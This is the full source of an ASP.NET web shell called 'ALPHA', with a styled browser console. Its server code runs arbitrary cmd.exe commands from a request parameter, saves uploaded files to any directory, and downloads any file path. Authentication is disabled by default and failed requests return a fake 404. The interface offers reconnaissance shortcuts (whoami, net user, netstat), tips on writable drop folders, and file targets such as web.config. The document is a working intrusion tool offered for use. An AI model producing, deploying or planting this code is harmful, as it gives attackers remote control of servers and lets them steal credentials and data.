<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    // ========== CONFIG ==========
    private const string VERSION = "1.0";
    private const string SECRET = "";  // Set to "" to disable, or add password
    
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.ContentType = "text/html";
        Response.Charset = "utf-8";
        
        // Auth check
        if (!string.IsNullOrEmpty(SECRET) && Request["k"] != SECRET)
        {
            Response.StatusCode = 404;
            Response.End();
            return;
        }
        
        // ========== HANDLE FILE UPLOAD ==========
        if (Request.Files.Count > 0 && Request.Files[0].ContentLength > 0)
        {
            try
            {
                var f = Request.Files[0];
                string targetDir = Request["dir"];
                if (string.IsNullOrEmpty(targetDir)) 
                    targetDir = Server.MapPath(".");
                
                string fullPath = Path.Combine(targetDir, Path.GetFileName(f.FileName));
                f.SaveAs(fullPath);
                
                Response.Write("UPLOADED|" + fullPath + "|" + f.ContentLength + " bytes");
            }
            catch (Exception ex)
            {
                Response.Write("ERROR|" + ex.Message);
            }
            Response.End();
            return;
        }
        
        // ========== HANDLE COMMAND ==========
        string cmd = Request["c"];
        if (!string.IsNullOrEmpty(cmd))
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = Request["w"] ?? Server.MapPath(".")
                };
                
                var p = Process.Start(psi);
                string output = p.StandardOutput.ReadToEnd();
                string err = p.StandardError.ReadToEnd();
                p.WaitForExit(30000);
                
                Response.Write(output + err);
            }
            catch (Exception ex) 
            { 
                Response.Write("ERROR: " + ex.Message); 
            }
            Response.End();
            return;
        }
        
        // ========== HANDLE FILE DOWNLOAD ==========
        string dl = Request["dl"];
        if (!string.IsNullOrEmpty(dl))
        {
            try
            {
                if (File.Exists(dl))
                {
                    Response.Clear();
                    Response.ContentType = "application/octet-stream";
                    Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(dl));
                    Response.WriteFile(dl);
                    Response.End();
                }
                else
                {
                    Response.Write("File not found: " + dl);
                    Response.End();
                }
            }
            catch (Exception ex) { Response.Write("E:" + ex.Message); Response.End(); }
            return;
        }
    }
</script>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>ALPHA v<%= VERSION %></title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            padding: 15px;
            min-height: 100vh;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 10px;
            border-bottom: 1px solid #30363d;
            margin-bottom: 15px;
        }
        .header .brand {
            display: flex;
            align-items: baseline;
            gap: 8px;
        }
        .header h1 { 
            font-size: 20px; 
            color: #58a6ff;
            font-weight: 700;
            letter-spacing: 4px;
            text-shadow: 0 0 10px rgba(88,166,255,0.5);
        }
        .header .version {
            color: #8b949e;
            font-size: 12px;
            background: #161b22;
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid #30363d;
            font-weight: 400;
        }
        .header .status {
            color: #3fb950;
            font-size: 12px;
        }
        .header .status .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #3fb950;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
        }
        .tab {
            padding: 8px 16px;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            cursor: pointer;
            color: #8b949e;
            transition: all 0.15s;
            font-size: 13px;
        }
        .tab:hover { background: #21262d; color: #c9d1d9; }
        .tab.active { 
            background: #1f6feb; 
            color: white; 
            border-color: #1f6feb;
        }
        .panel { display: none; }
        .panel.active { display: block; }
        
        .cmd-input-row {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
        }
        .cmd-input-row .prompt-label {
            display: flex;
            align-items: center;
            padding: 0 12px;
            background: #161b22;
            border: 1px solid #30363d;
            border-right: none;
            border-radius: 6px 0 0 6px;
            color: #58a6ff;
            font-weight: 700;
            letter-spacing: 2px;
            font-size: 13px;
        }
        .cmd-input-row input[type=text] {
            flex: 1;
            background: #0d1117;
            color: #c9d1d9;
            border: 1px solid #30363d;
            border-left: none;
            border-radius: 0 6px 6px 0;
            padding: 10px 14px;
            font-family: inherit;
            font-size: 14px;
            outline: none;
        }
        .cmd-input-row input[type=text]:focus {
            border-color: #1f6feb;
            box-shadow: 0 0 0 3px rgba(31,111,235,0.15);
        }
        .cmd-input-row button {
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            font-weight: 500;
            transition: background 0.15s;
        }
        .cmd-input-row button:hover { background: #2ea043; }
        .cmd-input-row button:disabled { background: #21262d; color: #8b949e; cursor: not-allowed; }
        
        .output {
            background: #010409;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 15px;
            min-height: 400px;
            max-height: 600px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 13px;
            line-height: 1.5;
            color: #c9d1d9;
        }
        .output .cmd-echo {
            color: #58a6ff;
            font-weight: 500;
        }
        .output .error { color: #f85149; }
        .output .success { color: #3fb950; }
        .output .info { color: #8b949e; font-style: italic; }
        .output .alpha-banner {
            color: #58a6ff;
            font-weight: 700;
            letter-spacing: 2px;
        }
        
        .upload-row {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
            padding: 15px;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            margin-bottom: 12px;
        }
        .upload-row input[type=file] {
            color: #c9d1d9;
            font-family: inherit;
            font-size: 13px;
        }
        .upload-row input[type=file]::file-selector-button {
            background: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 8px 14px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            margin-right: 10px;
        }
        .upload-row input[type=file]::file-selector-button:hover { background: #30363d; }
        .upload-row input[type=text] {
            flex: 1;
            min-width: 200px;
            background: #0d1117;
            color: #c9d1d9;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 8px 14px;
            font-family: inherit;
            font-size: 13px;
            outline: none;
        }
        .upload-row button {
            background: #1f6feb;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 9px 20px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            font-weight: 500;
        }
        .upload-row button:hover { background: #388bfd; }
        .upload-row button:disabled { background: #21262d; color: #8b949e; cursor: not-allowed; }
        
        .progress {
            height: 6px;
            background: #21262d;
            border-radius: 3px;
            overflow: hidden;
            margin-top: 10px;
            display: none;
        }
        .progress.active { display: block; }
        .progress-bar {
            height: 100%;
            background: #1f6feb;
            width: 0%;
            transition: width 0.2s;
        }
        
        .hint {
            color: #8b949e;
            font-size: 12px;
            margin-top: 8px;
        }
        .hint code {
            background: #161b22;
            padding: 2px 6px;
            border-radius: 4px;
            color: #79c0ff;
        }
        
        .quick-cmds {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 12px;
        }
        .quick-cmd {
            background: #161b22;
            border: 1px solid #30363d;
            color: #8b949e;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            font-family: inherit;
        }
        .quick-cmd:hover { background: #21262d; color: #c9d1d9; border-color: #8b949e; }
        
        .footer {
            margin-top: 15px;
            padding-top: 10px;
            border-top: 1px solid #30363d;
            display: flex;
            justify-content: space-between;
            color: #484f58;
            font-size: 11px;
        }
    </style>
</head>
<body>

<div class="header">
    <div class="brand">
        <h1>ALPHA</h1>
        <span class="version">v<%= VERSION %></span>
    </div>
    <div class="status">
        <span class="dot"></span>
        ONLINE - <%= Environment.MachineName %> / <%= Environment.UserName %>
    </div>
</div>

<div class="tabs">
    <div class="tab active" onclick="switchTab('cmd')">Command</div>
    <div class="tab" onclick="switchTab('upload')">Upload</div>
    <div class="tab" onclick="switchTab('download')">Download</div>
    <div class="tab" onclick="switchTab('info')">Info</div>
</div>

<!-- ============ COMMAND TAB ============ -->
<div class="panel active" id="panel-cmd">
    <div class="quick-cmds">
        <span class="quick-cmd" onclick="runCmd('whoami')">whoami</span>
        <span class="quick-cmd" onclick="runCmd('ipconfig /all')">ipconfig</span>
        <span class="quick-cmd" onclick="runCmd('systeminfo')">systeminfo</span>
        <span class="quick-cmd" onclick="runCmd('tasklist')">tasklist</span>
        <span class="quick-cmd" onclick="runCmd('net user')">net user</span>
        <span class="quick-cmd" onclick="runCmd('netstat -ano')">netstat</span>
        <span class="quick-cmd" onclick="runCmd('dir C:\\')">dir C:\</span>
        <span class="quick-cmd" onclick="runCmd('cd')">pwd</span>
    </div>
    
    <div class="cmd-input-row">
        <div class="prompt-label">ALPHA&gt;</div>
        <input type="text" id="cmdInput" placeholder="Enter command..." autofocus 
               onkeydown="if(event.key==='Enter') execCmd()" />
        <button id="execBtn" onclick="execCmd()">Run</button>
        <button onclick="clearOutput()" style="background:#21262d;color:#c9d1d9">Clear</button>
    </div>
    
    <div class="output" id="output"><span class="alpha-banner">ALPHA v1.0</span> <span class="info">- ready. Type a command or click a quick command above.</span></div>
</div>

<!-- ============ UPLOAD TAB ============ -->
<div class="panel" id="panel-upload">
    <div class="upload-row">
        <input type="file" id="fileInput" />
        <input type="text" id="uploadDir" placeholder="Target directory (leave empty for webroot)" />
        <button id="uploadBtn" onclick="uploadFile()">Upload</button>
    </div>
    <div class="progress" id="progress"><div class="progress-bar" id="progressBar"></div></div>
    <div class="output" id="uploadOutput"><span class="info">Select a file and click Upload.</span></div>
    <div class="hint">Tip: use <code>C:\Windows\Temp</code> or <code>C:\Users\Public</code> for writable directories.</div>
</div>

<!-- ============ DOWNLOAD TAB ============ -->
<div class="panel" id="panel-download">
    <div class="cmd-input-row">
        <input type="text" id="dlPath" placeholder="Full path to file (e.g., C:\Windows\win.ini)" style="border-radius:6px;border-left:1px solid #30363d;" />
        <button onclick="downloadFile()">Download</button>
    </div>
    <div class="output" id="dlOutput"><span class="info">Enter a file path to download.</span></div>
    <div class="hint">Common targets: <code>C:\Windows\win.ini</code>, <code>C:\Windows\System32\drivers\etc\hosts</code>, <code>web.config</code></div>
</div>

<!-- ============ INFO TAB ============ -->
<div class="panel" id="panel-info">
    <div class="output" id="infoOutput"><span class="info">Loading system info...</span></div>
</div>

<div class="footer">
    <span>ALPHA Framework - v<%= VERSION %></span>
    <span>Build: <%= System.Reflection.Assembly.GetExecutingAssembly().GetName().Version %></span>
</div>

<script>
var ALPHA_VERSION = "1.0";

// ==================== TAB SWITCHING ====================
function switchTab(name) {
    var tabs = document.querySelectorAll('.tab');
    var panels = document.querySelectorAll('.panel');
    for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('active');
    for (var i = 0; i < panels.length; i++) panels[i].classList.remove('active');
    event.target.classList.add('active');
    document.getElementById('panel-' + name).classList.add('active');
    
    if (name === 'info') loadInfo();
    if (name === 'cmd') document.getElementById('cmdInput').focus();
}

// ==================== COMMAND EXECUTION ====================
function execCmd() {
    var input = document.getElementById('cmdInput');
    var cmd = input.value.trim();
    if (!cmd) return;
    runCmd(cmd);
    input.value = '';
}

function runCmd(cmd) {
    var output = document.getElementById('output');
    var btn = document.getElementById('execBtn');
    
    output.innerHTML += '\n<span class="cmd-echo">ALPHA> ' + escapeHtml(cmd) + '</span>\n';
    output.scrollTop = output.scrollHeight;
    
    btn.disabled = true;
    btn.textContent = '...';
    
    fetch('?c=' + encodeURIComponent(cmd))
        .then(function(r) { return r.text(); })
        .then(function(data) {
            output.innerHTML += escapeHtml(data) + '\n';
            output.scrollTop = output.scrollHeight;
        })
        .catch(function(err) {
            output.innerHTML += '<span class="error">Error: ' + escapeHtml(err.message) + '</span>\n';
        })
        .then(function() {
            btn.disabled = false;
            btn.textContent = 'Run';
        });
}

function clearOutput() {
    document.getElementById('output').innerHTML = '<span class="alpha-banner">ALPHA v' + ALPHA_VERSION + '</span> <span class="info">- console cleared.</span>';
}

// ==================== FILE UPLOAD ====================
function uploadFile() {
    var fileInput = document.getElementById('fileInput');
    var dirInput = document.getElementById('uploadDir');
    var output = document.getElementById('uploadOutput');
    var btn = document.getElementById('uploadBtn');
    var progress = document.getElementById('progress');
    var bar = document.getElementById('progressBar');
    
    if (!fileInput.files.length) {
        output.innerHTML = '<span class="error">Please select a file first.</span>';
        return;
    }
    
    var file = fileInput.files[0];
    var formData = new FormData();
    formData.append('file', file);
    if (dirInput.value.trim()) {
        formData.append('dir', dirInput.value.trim());
    }
    
    btn.disabled = true;
    btn.textContent = 'Uploading...';
    progress.classList.add('active');
    bar.style.width = '0%';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.pathname);
    
    xhr.upload.onprogress = function(e) {
        if (e.lengthComputable) {
            var pct = Math.round((e.loaded / e.total) * 100);
            bar.style.width = pct + '%';
        }
    };
    
    xhr.onload = function() {
        progress.classList.remove('active');
        btn.disabled = false;
        btn.textContent = 'Upload';
        
        var resp = xhr.responseText;
        if (resp.indexOf('UPLOADED|') === 0) {
            var parts = resp.split('|');
            output.innerHTML = '<span class="success">Uploaded successfully!</span>\n' +
                              'Path: <b>' + escapeHtml(parts[1]) + '</b>\n' +
                              'Size: ' + parts[2] + '\n' +
                              'Filename: ' + escapeHtml(file.name);
        } else if (resp.indexOf('ERROR|') === 0) {
            output.innerHTML = '<span class="error">' + escapeHtml(resp.substring(6)) + '</span>';
        } else {
            output.innerHTML = '<span class="error">Unexpected response:</span>\n' + escapeHtml(resp);
        }
    };
    
    xhr.onerror = function() {
        progress.classList.remove('active');
        btn.disabled = false;
        btn.textContent = 'Upload';
        output.innerHTML = '<span class="error">Upload failed (network error)</span>';
    };
    
    xhr.send(formData);
}

// ==================== FILE DOWNLOAD ====================
function downloadFile() {
    var path = document.getElementById('dlPath').value.trim();
    if (!path) return;
    
    var output = document.getElementById('dlOutput');
    output.innerHTML = '<span class="info">Downloading ' + escapeHtml(path) + '...</span>';
    
    window.location.href = '?dl=' + encodeURIComponent(path);
    
    setTimeout(function() {
        output.innerHTML = '<span class="success">Download triggered. Check your browser downloads.</span>';
    }, 500);
}

// ==================== SYSTEM INFO ====================
function loadInfo() {
    var output = document.getElementById('infoOutput');
    if (output.dataset.loaded) return;
    output.innerHTML = '<span class="info">Loading...</span>';
    
    fetch('?c=' + encodeURIComponent('echo Hostname: %COMPUTERNAME% && echo User: %USERNAME% && echo Domain: %USERDOMAIN% && echo Processor: %PROCESSOR_ARCHITECTURE% && echo OS: %OS% && ver'))
        .then(function(r) { return r.text(); })
        .then(function(data) {
            output.innerHTML = '<span class="alpha-banner">ALPHA v' + ALPHA_VERSION + '</span> <span class="cmd-echo">- System Information:</span>\n\n' + escapeHtml(data);
            output.dataset.loaded = '1';
        });
}

// ==================== UTIL ====================
function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, function(c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
}

// Ctrl+L to clear, Ctrl+K focus input
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.key === 'l') { e.preventDefault(); clearOutput(); }
    if (e.ctrlKey && e.key === 'k') { e.preventDefault(); document.getElementById('cmdInput').focus(); }
});
</script>
</body>
</html>
